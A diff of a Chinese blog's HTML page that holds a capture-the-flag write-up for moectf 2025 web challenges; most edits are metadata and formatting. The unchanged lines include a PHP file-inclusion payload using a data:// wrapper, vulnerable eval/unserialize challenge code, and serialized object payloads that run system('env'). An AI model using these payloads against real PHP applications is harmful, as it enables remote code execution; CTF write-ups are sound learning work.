@@ -14,18 +14,17 @@
 <meta property="og:site_name" content="aClosure&#39;s奇妙的妙妙据点">
 <meta property="og:description" content="看web看得头大……遂决定先把moe25和26的wp传了再说（看tsctf的题好难&#x2F;(ㄒoㄒ)&#x2F;~~">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/images/cover/06.jpg">
 <meta property="article:published_time" content="2026-09-05T14:54:07.000Z">
-<meta property="article:modified_time" content="2026-09-14T14:57:29.552Z">
+<meta property="article:modified_time" content="2026-09-20T11:00:53.871Z">
 <meta property="article:author" content="aClosure">
+<meta property="article:tag" content="omakase">
 <meta property="article:tag" content="dev">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/images/cover/06.jpg">
 <link rel="canonical" href="http://example.com/2026/09/05/moe2025_web/">
 
 <link rel="icon" href="/images/Ak_char_007_closre_3.png" type="image/png">
 
-<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"moectf 2025-web write-up","name":"moectf 2025-web write-up | aClosure's奇妙的妙妙据点","description":"看web看得头大……遂决定先把moe25和26的wp传了再说（看tsctf的题好难/(ㄒoㄒ)/~~","url":"http://example.com/2026/09/05/moe2025_web/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"http://example.com/"},"image":["http://example.com/images/cover/06.jpg"],"mainEntityOfPage":"http://example.com/2026/09/05/moe2025_web/","datePublished":"2026-09-05T14:54:07.000Z","dateModified":"2026-09-14T14:57:29.552Z","author":{"@type":"Person","name":"aClosure"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"dev"}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"moectf 2025-web write-up","name":"moectf 2025-web write-up | aClosure's奇妙的妙妙据点","description":"看web看得头大……遂决定先把moe25和26的wp传了再说（看tsctf的题好难/(ㄒoㄒ)/~~","url":"http://example.com/2026/09/05/moe2025_web/","inLanguage":"zh-CN","isPartOf":{"@type":"WebSite","name":"aClosure's奇妙的妙妙据点","url":"http://example.com/"},"mainEntityOfPage":"http://example.com/2026/09/05/moe2025_web/","datePublished":"2026-09-05T14:54:07.000Z","dateModified":"2026-09-20T11:00:53.871Z","author":{"@type":"Person","name":"aClosure"},"publisher":{"@type":"Organization","name":"aClosure's奇妙的妙妙据点"},"keywords":"omakase, dev"}</script>
 
 <script>
   (function () {
@@ -343,21 +342,21 @@
         
           
             <a class="site-info__item" href="/archives/">
-              <strong>5</strong>
+              <strong>6</strong>
               <span>文章</span>
             </a>
           
         
           
             <a class="site-info__item" href="/categories/">
-              <strong>3</strong>
+              <strong>4</strong>
               <span>分类</span>
             </a>
           
         
           
             <a class="site-info__item" href="/tags/">
-              <strong>3</strong>
+              <strong>5</strong>
               <span>标签</span>
             </a>
           
@@ -462,11 +461,7 @@
 
 <div class="article-tape-wrap">
 <span class="tape tape--top-right" aria-hidden="true"></span>
-<article class="article-paper article-paper--with-top-img">
-  
-    <figure class="article-top-img" aria-label="moectf 2025-web write-up">
-      <img src="/images/cover/06.jpg" alt="" loading="eager" fetchpriority="high" referrerpolicy="no-referrer" draggable="false">
-    </figure>
+<article class="article-paper">
   
   <header class="article-header">
     
@@ -487,7 +482,7 @@
           
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-tag flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-tag"></use></svg>
 
-          <a class="meta-tag-link" href="/tags/dev/">#dev</a>
+          <a class="meta-tag-link" href="/tags/omakase/">#omakase</a><a class="meta-tag-link" href="/tags/dev/">#dev</a>
         </span>
       
     </div>
@@ -648,7 +643,7 @@ W2：“禁止上传攻伐符咒（如.php, .php5, .jsp, .asp等邪道术法）�
 
 不知道为什么始终不行，明天继续试
 
-## T16-**昆仑星途**
+## T16-昆仑星途
 
 ~~牛魔这段是重写的，typedown什么垃圾编辑器滚一边去吧(ノ｀Д)ノ~~
 
@@ -664,12 +659,12 @@ W2：“禁止上传攻伐符咒（如.php, .php5, .jsp, .asp等邪道术法）�
 
 故输入/?file=data://text/plain,<?php system('env') ?>，结果牛魔什么都没有，出题人坏🤬
 <p>这次尝试ls /，发现一个随机生成的flag文件，cat /flag-一堆.txt即可</p>
-<h2 id="T17-星骸迷阵·神念重构">T17-<strong>星骸迷阵·神念重构</strong></h2>
+<h2 id="T17-星骸迷阵·神念重构">T17-星骸迷阵·神念重构</h2>
 <p>发现php：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>是个反序列化漏洞利用，unserialize结束时对象自动销毁，会触发__destruct()这个魔术方法，故而构造：</p>
 <p>/?a=O:1:“A”:1:{s:1:“a”;s:13:“system(‘env’);”;}即可得到flag，出题人好😋</p>
-<h2 id="T18-万卷诡阁·功法连环">T18-<strong>万卷诡阁·功法连环</strong></h2>
+<h2 id="T18-万卷诡阁·功法连环">T18-万卷诡阁·功法连环</h2>
 <p>打开后发现是一段php，典型的pop链构造：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonA</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="variable">$name</span>-&gt;<span class="title function_ invoke__">work</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PersonB</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">work</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$name</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>分析可知：WeakPoint: eval($name)</p>
@@ -682,7 +677,7 @@ W2：“禁止上传攻伐符咒（如.php, .php5, .jsp, .asp等邪道术法）�
 <p>之后得到</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">7</span>:<span class="string">&quot;PersonA&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">7</span>:<span class="string">&quot;PersonB&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">14</span>:<span class="string">&quot;system(&quot;</span>env<span class="string">&quot;);&quot;</span>;&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>将外层的name改成私有属性即可，s:13:“%00PersonA%00name” 注意一个%00只占一个位置</p>
-<h2 id="T19-星穹真相·补天归源">T19-<strong>星穹真相·补天归源</strong></h2>
+<h2 id="T19-星穹真相·补天归源">T19-星穹真相·补天归源</h2>
 <p>笔者看了题半天，感觉要累死了，下午/明天继续</p>
 
   </div>
@@ -735,9 +730,9 @@ W2：“禁止上传攻伐符咒（如.php, .php5, .jsp, .asp等邪道术法）�
       </a>
     
     
-      <a class="article-action article-action--next" href="/2026/08/12/%E4%BB%8E%E9%9B%B6%EF%BC%88%EF%BC%9F%EF%BC%89%E5%BC%80%E5%A7%8B%E7%9A%84blog%E6%90%AD%E5%BB%BA/">
+      <a class="article-action article-action--next" href="/2026/08/19/gal_CloverDays/">
         <span class="action-label">下一篇</span>
-        <span class="action-title">从零开始（？）的blog搭建</span>
+        <span class="action-title">由约定连缀起的&amp;nbsp&amp;</span>
         
 <svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round" class="lucide lucide-arrow-right flatpaper-icon flatpaper-icon--lucide" aria-hidden="true"><use href="/icons.svg#flatpaper-icon-lucide-arrow-right"></use></svg>
 
